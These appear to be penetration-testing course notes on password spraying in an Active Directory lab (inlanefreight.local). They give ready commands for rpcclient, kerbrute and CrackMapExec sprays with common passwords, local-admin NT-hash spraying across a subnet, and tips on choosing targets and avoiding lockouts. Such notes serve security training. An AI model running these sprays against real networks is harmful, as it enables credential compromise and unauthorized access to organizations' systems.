
#### Using Bash one-liner with rpcclient
``` bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### Using Kerbrute
``` bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

#### Using CrackMapExec & Filtering Logon Failures
``` bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### Validating Credentials with CME
``` bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

## Local Administrator Password Reuse
- Local admin password reuse is widespread due to the use of gold images in automated deployments and ease of use.
- It's worth targeting high value hosts like SQL or Exchange server because they are more likely to have a highly priv'd user logged in or have credentials in memory.


#### Local Admin Spaying with CrackMapExec
``` bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
- If we only get the NTLM hash for the local admin from the SAM database, we can spray the NT hash to look for local admin accounts with the same password.
- The `--local-auth` flag makes the tool only attempt to log in once per machine which removes lockout risk.
	- __Make sure this flag is set so we don't lock out Domain Admins!__
- This technique is effective but also __very noisy__. 

